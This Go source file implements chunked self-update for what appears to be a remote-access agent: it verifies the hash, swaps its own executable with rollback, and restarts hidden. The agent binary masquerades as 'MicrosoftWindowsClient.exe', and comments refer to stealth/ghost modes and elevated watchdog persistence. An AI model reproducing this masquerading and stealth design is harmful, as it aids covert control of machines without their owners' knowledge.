package commands

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"rmm/internal/version"
)

// Agent self-update (force-update): the controller streams its bundled
// agent binary in numbered base64 chunks; the agent reassembles (order
// tolerant for QoS0 relays), verifies SHA256, swaps its own exe, and
// restarts. Works over every transport; needs no new network paths.

var updateMu sync.Mutex
var updateState *updateSession

type updateSession struct {
	version string
	size    int64
	sha     string
	total   int
	gzip    bool
	chunks  map[int][]byte
}

// updateCacheDir persists one in-flight update next to the exe so a failed
// push resumes instead of restarting at chunk 0.
func updateCacheDir() string {
	exe, err := os.Executable()
	if err != nil {
		return filepath.Join(os.TempDir(), "RMM", "update_cache")
	}
	return filepath.Join(filepath.Dir(exe), "update_cache")
}

type updateManifest struct {
	Version string `json:"version"`
	Size    int64  `json:"size"`
	SHA     string `json:"sha"`
	Total   int    `json:"total"`
	Gzip    bool   `json:"gzip"`
}

// rangesOf compresses a have-set into "0-9,12-20" form for the resume reply.
func rangesOf(have map[int]bool, total int) string {
	var parts []string
	start := -1
	for i := 0; i <= total; i++ {
		if i < total && have[i] {
			if start < 0 {
				start = i
			}
			continue
		}
		if start >= 0 {
			if i-1 == start {
				parts = append(parts, strconv.Itoa(start))
			} else {
				parts = append(parts, fmt.Sprintf("%d-%d", start, i-1))
			}
			start = -1
		}
	}
	return strings.Join(parts, ",")
}

// parseRanges is the controller-side inverse (kept here next to the format).
func ParseRanges(s string, total int) map[int]bool {
	have := map[int]bool{}
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if lo, hi, ok := strings.Cut(p, "-"); ok {
			a, err1 := strconv.Atoi(strings.TrimSpace(lo))
			b, err2 := strconv.Atoi(strings.TrimSpace(hi))
			if err1 != nil || err2 != nil {
				continue
			}
			for i := a; i <= b && i < total; i++ {
				if i >= 0 {
					have[i] = true
				}
			}
		} else if n, err := strconv.Atoi(p); err == nil && n >= 0 && n < total {
			have[n] = true
		}
	}
	return have
}

// StartAgentUpdate begins a self-update transfer. When the on-disk cache
// already holds chunks of the identical manifest (interrupted push), they
// are kept and the reply reports have/total + ranges so the controller
// sends only what's missing.
func StartAgentUpdate(version string, size int64, sha string, total int, gzip bool) (string, error) {
	if total <= 0 || total > 100000 {
		return "", fmt.Errorf("bad update manifest (total=%d)", total)
	}
	if size <= 0 || size > 256<<20 {
		return "", fmt.Errorf("bad update manifest (size=%d)", size)
	}
	updateMu.Lock()
	defer updateMu.Unlock()
	dir := updateCacheDir()
	_ = os.MkdirAll(dir, 0755)
	have := map[int][]byte{}
	if raw, err := os.ReadFile(filepath.Join(dir, "manifest.json")); err == nil {
		var m updateManifest
		if json.Unmarshal(raw, &m) == nil && m.Version == version && m.SHA == sha && m.Total == total && m.Size == size && m.Gzip == gzip {
			if entries, err := os.ReadDir(dir); err == nil {
				for _, e := range entries {
					var seq int
					if _, err := fmt.Sscanf(e.Name(), "chunk_%d.bin", &seq); err != nil {
						continue
					}
					if seq < 0 || seq >= total {
						continue
					}
					if b, err := os.ReadFile(filepath.Join(dir, e.Name())); err == nil {
						have[seq] = b
					}
				}
			}
		} else {
			// Different update: wipe stale cache.
			if entries, err := os.ReadDir(dir); err == nil {
				for _, e := range entries {
					_ = os.Remove(filepath.Join(dir, e.Name()))
				}
			}
		}
	}
	man, _ := json.Marshal(updateManifest{Version: version, Size: size, SHA: sha, Total: total, Gzip: gzip})
	_ = os.WriteFile(filepath.Join(dir, "manifest.json"), man, 0644)
	updateState = &updateSession{
		version: version,
		size:    size,
		sha:     sha,
		total:   total,
		gzip:    gzip,
		chunks:  have,
	}
	if len(have) > 0 {
		hs := map[int]bool{}
		for k := range have {
			hs[k] = true
		}
		return fmt.Sprintf("update resume have %d/%d ranges %s", len(have), total, rangesOf(hs, total)), nil
	}
	return fmt.Sprintf("update %s accepted (%d bytes in %d chunks)", version, size, total), nil
}

// WriteUpdateChunk stores one chunk (memory + disk for resume); finalizes
// (verify + swap + restart) when the set completes. Progress is reported
// every 10%.
func WriteUpdateChunk(seq int, b64 string) (string, error) {
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return "", fmt.Errorf("chunk %d: bad base64", seq)
	}
	updateMu.Lock()
	st := updateState
	if st == nil {
		updateMu.Unlock()
		return "", fmt.Errorf("no update in progress (send update_begin first)")
	}
	if seq < 0 || seq >= st.total {
		updateMu.Unlock()
		return "", fmt.Errorf("chunk %d out of range", seq)
	}
	fresh := false
	if _, dup := st.chunks[seq]; !dup {
		st.chunks[seq] = raw
		fresh = true
	}
	n := len(st.chunks)
	done := n == st.total
	gz := st.gzip
	updateMu.Unlock()
	if fresh {
		_ = os.WriteFile(filepath.Join(updateCacheDir(), fmt.Sprintf("chunk_%d.bin", seq)), raw, 0644)
	}
	_ = gz
	if !done {
		if n% BlochSize() == 0 || n == st.total-1 {
			return fmt.Sprintf("update %d/%d chunks", n, st.total), nil
		}
		return "", nil
	}
	return finalizeUpdate()
}

// BlochSize controls progress-report granularity.
func BlochSize() int { return 10 }

func finalizeUpdate() (string, error) {
	updateMu.Lock()
	st := updateState
	updateState = nil
	updateMu.Unlock()
	if st == nil {
		return "", fmt.Errorf("no update in progress")
	}
	assembled := make([]byte, 0, st.size)
	for i := 0; i < st.total; i++ {
		c, ok := st.chunks[i]
		if !ok {
			return "", fmt.Errorf("update incomplete: missing chunk %d, retry push", i)
		}
		assembled = append(assembled, c...)
	}
	if int64(len(assembled)) != st.size {
		return "", fmt.Errorf("update size mismatch (%d != %d), retry push", len(assembled), st.size)
	}
	sum := sha256.Sum256(assembled)
	if hex.EncodeToString(sum[:]) != st.sha {
		return "", fmt.Errorf("update hash mismatch, retry push (nothing changed)")
	}
	if st.gzip {
		zr, err := gzip.NewReader(bytes.NewReader(assembled))
		if err != nil {
			return "", fmt.Errorf("update gunzip init: %v", err)
		}
		plain, err := io.ReadAll(zr)
		_ = zr.Close()
		if err != nil {
			return "", fmt.Errorf("update gunzip (CRC covers integrity): %v", err)
		}
		if len(plain) == 0 {
			return "", fmt.Errorf("update gunzip yielded empty binary")
		}
		assembled = plain
	}
	// Transfer complete: drop the resume cache (a future push starts clean).
	_ = os.RemoveAll(updateCacheDir())
	exe, err := os.Executable()
	if err != nil {
		return "", err
	}
	dir := filepath.Dir(exe)
	prevExe := filepath.Join(dir, "MicrosoftWindowsClient.prev.exe")
	prevVerFile := filepath.Join(dir, "version.prev.txt")
	pendingFile := filepath.Join(dir, "pending_update.json")
	// Stash the running binary as the rollback candidate BEFORE swapping,
	// so a buggy new version can always be unwound (by the watchdog, which
	// watches for crash loops). The .bak scheme is gone: prev is explicit.
	// Windows allows renaming a running exe (the old .bak slot is now the
	// explicit prev rollback candidate); Unix replaces the inode.
	_ = os.Remove(prevExe)
	_ = os.WriteFile(prevVerFile, []byte(version.DesktopAgentVersion+"\n"), 0644)
	if err := os.Rename(exe, prevExe); err != nil {
		if os.IsPermission(err) {
			// Standard-user agent in an admin-owned dir: it can create
			// files (chunk cache works) but cannot rename the running
			// exe. Stage the binary for an elevated context (watcher /
			// WMI heal / service run as admin-SYSTEM and swap it on
			// their next run) instead of failing outright.
			return stageUpdate(exe, assembled, st)
		}
		return "", fmt.Errorf("swap failed (need admin?): %v", err)
	}
	if err := os.WriteFile(exe, assembled, 0755); err != nil {
		_ = os.Rename(prevExe, exe) // best-effort rollback
		return "", fmt.Errorf("write failed, rolled back: %v", err)
	}
	// Stamp the new version NOW (before spawn): the integrity watcher
	// compares install bytes vs backup bytes only when versions match, so a
	// stale version.txt here would look like a trojan swap post-restart.
	_ = os.WriteFile(filepath.Join(dir, "version.txt"), []byte(st.version+"\n"), 0644)
	// Updates always land back in normal mode (stealth/ghost boxes don't
	// stay invisible after you push a fix to them).
	_ = os.WriteFile(filepath.Join(dir, "mode.json"), []byte(ModeNormal+"\n"), 0644)
	// Record the pending update: the new binary confirms it by surviving
	// 90s (ConfirmUpdate deletes prev); a crash loop keeps prev around for
	// the watchdog to restore.
	pend, _ := json.Marshal(map[string]string{
		"from": version.DesktopAgentVersion, "to": st.version,
		"at": time.Now().UTC().Format(time.RFC3339),
	})
	_ = os.WriteFile(pendingFile, pend, 0644)
	// Restart into the new binary; the singleton + watchdog dedupe any
	// overlap with task-triggered starts. If the spawn itself fails, roll
	// back so the old binary keeps running instead of bricking the remote.
	cmd := hideWindow(exec.Command(exe, os.Args[1:]...))
	if err := cmd.Start(); err != nil {
		_ = os.Remove(exe)
		_ = os.Rename(prevExe, exe)
		_ = os.WriteFile(filepath.Join(dir, "version.txt"), []byte(version.DesktopAgentVersion+"\n"), 0644)
		_ = os.Remove(pendingFile)
		return "", fmt.Errorf("restart failed, rolled back: %v", err)
	}
	go func() {
		// Grace for the "updated" output to flush, then hand over.
		time.Sleep(1500 * time.Millisecond)
		os.Exit(0)
	}()
	return fmt.Sprintf("updated to %s, restarting (rollback ready)", st.version), nil
}

// pendingUpdate is the on-disk claim left by finalizeUpdate.
type pendingUpdate struct {
	From   string `json:"from"`
	To     string `json:"to"`
	At     string `json:"at"`
	Staged bool   `json:"staged,omitempty"`
}

// stageUpdate stores a verified binary as MicrosoftWindowsClient.new.exe
// for an elevated context to swap in. The agent itself runs unelevated on
// many boxes (Access denied on rename of the admin-owned exe); the
// watcher, WMI heal, and SYSTEM service all run elevated and call
// ApplyStagedUpdate on their next run. Returns a progress message (not an
// error) so the controller reports "staged, waiting for elevated apply"
// and keeps its desired queue until the new version's hello confirms.
func stageUpdate(exe string, assembled []byte, st *updateSession) (string, error) {
	dir := filepath.Dir(exe)
	staged := filepath.Join(dir, "MicrosoftWindowsClient.new.exe")
	if err := os.WriteFile(staged, assembled, 0755); err != nil {
		return "", fmt.Errorf("stage failed (need admin?): %v", err)
	}
	pend, _ := json.Marshal(pendingUpdate{
		From: version.DesktopAgentVersion, To: st.version,
		At: time.Now().UTC().Format(time.RFC3339), Staged: true,
	})
	_ = os.WriteFile(filepath.Join(dir, "pending_update.json"), pend, 0644)
	_ = os.RemoveAll(updateCacheDir())
	log.Printf("[*] Update %s staged (no swap rights) — elevated watcher/service applies it next run", st.version)
	return fmt.Sprintf("update %s staged (%d bytes) — waiting for elevated apply (watcher/service swaps on next run)", st.version, len(assembled)), nil
}

// stagedPaths reports the staged binary + claim next to the exe.
func stagedPaths() (newExe, pendFile, dir string) {
	exe, err := os.Executable()
	if err != nil {
		return "", "", ""
	}
	dir = filepath.Dir(exe)
	return filepath.Join(dir, "MicrosoftWindowsClient.new.exe"),
		filepath.Join(dir, "pending_update.json"), dir
}

// ApplyStagedUpdate swaps a staged .new.exe into place. Called at startup
// of elevated contexts (watcher, WMI heal, SYSTEM service): those can
// rename the admin-owned exe while a standard-user agent cannot. The
// running old process is untouched until restart (Windows allows renaming
// a running exe). Returns true when it applied something.
func ApplyStagedUpdate() bool {
	newExe, pendFile, dir := stagedPaths()
	if newExe == "" {
		return false
	}
	if _, err := os.Stat(newExe); err != nil {
		return false
	}
	raw, err := os.ReadFile(pendFile)
	if err != nil {
		return false
	}
	var pend pendingUpdate
	if err := json.Unmarshal(raw, &pend); err != nil || !pend.Staged || pend.To == "" {
		return false
	}
	exe, err := os.Executable()
	if err != nil {
		return false
	}
	prevExe := filepath.Join(dir, "MicrosoftWindowsClient.prev.exe")
	_ = os.Remove(prevExe)
	_ = os.WriteFile(filepath.Join(dir, "version.prev.txt"), []byte(version.DesktopAgentVersion+"\n"), 0644)
	if err := os.Rename(exe, prevExe); err != nil {
		log.Printf("[!] staged apply: rename running exe failed: %v", err)
		return false
	}
	if b, err := os.ReadFile(newExe); err != nil {
		_ = os.Rename(prevExe, exe)
		return false
	} else if err := os.WriteFile(exe, b, 0755); err != nil {
		_ = os.Rename(prevExe, exe)
		log.Printf("[!] staged apply: write failed, rolled back: %v", err)
		return false
	}
	_ = os.Remove(newExe)
	_ = os.WriteFile(filepath.Join(dir, "version.txt"), []byte(pend.To+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(dir, "mode.json"), []byte(ModeNormal+"\n"), 0644)
	claim, _ := json.Marshal(pendingUpdate{From: pend.From, To: pend.To, At: pend.At})
	_ = os.WriteFile(pendFile, claim, 0644)
	log.Printf("[*] Staged update to %s applied, restart picks it up", pend.To)
	return true
}

// ConfirmUpdate runs in the NEW binary shortly after startup: if we survive
// 10 minutes, the update is declared healthy and the prev backup + pending
// claim are cleared. If we crash first, prev survives for the watchdog to
// roll back to. Call once as a goroutine from main (never blocks shutdown).
func ConfirmUpdate() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	dir := filepath.Dir(exe)
	pendRaw, err := os.ReadFile(filepath.Join(dir, "pending_update.json"))
	if err != nil {
		return // no pending update
	}
	var pend pendingUpdate
	if err := json.Unmarshal(pendRaw, &pend); err != nil {
		return
	}
	if pend.To != "" && pend.To != version.DesktopAgentVersion {
		return // stale claim from an older attempt
	}
	time.Sleep(10 * time.Minute)
	_ = os.Remove(filepath.Join(dir, "MicrosoftWindowsClient.prev.exe"))
	_ = os.Remove(filepath.Join(dir, "version.prev.txt"))
	_ = os.Remove(filepath.Join(dir, "pending_update.json"))
	log.Printf("[*] Update to %s confirmed healthy (10min survived), prev backup cleared", version.DesktopAgentVersion)
}

// RollbackNotice is a crash-rollback report left by the watchdog.
type RollbackNotice struct {
	Bad string `json:"bad"`
	To  string `json:"to"`
	At  string `json:"at"`
}

// rollbackNoticePath is the watchdog-written crash-rollback report.
func rollbackNoticePath() string {
	exe, err := os.Executable()
	if err != nil {
		return filepath.Join(os.TempDir(), "rollback_notice.json")
	}
	return filepath.Join(filepath.Dir(exe), "rollback_notice.json")
}

// LoadRollbackNotice reads rollback_notice.json next to the exe. The file
// is intentionally NOT consumed here: the notice is re-attached to every
// hello until the controller acks it (see ConsumeRollbackNotice), so a
// controller restart can never lose the alarm.
func LoadRollbackNotice() *RollbackNotice {
	raw, err := os.ReadFile(rollbackNoticePath())
	if err != nil {
		return nil
	}
	var n RollbackNotice
	if err := json.Unmarshal(raw, &n); err != nil || n.Bad == "" {
		return nil
	}
	log.Printf("[!] Rolled back: v%s crash-looped, restored v%s", n.Bad, n.To)
	return &n
}

// ConsumeRollbackNotice clears a controller-acked rollback report.
func ConsumeRollbackNotice() {
	_ = os.Remove(rollbackNoticePath())
}
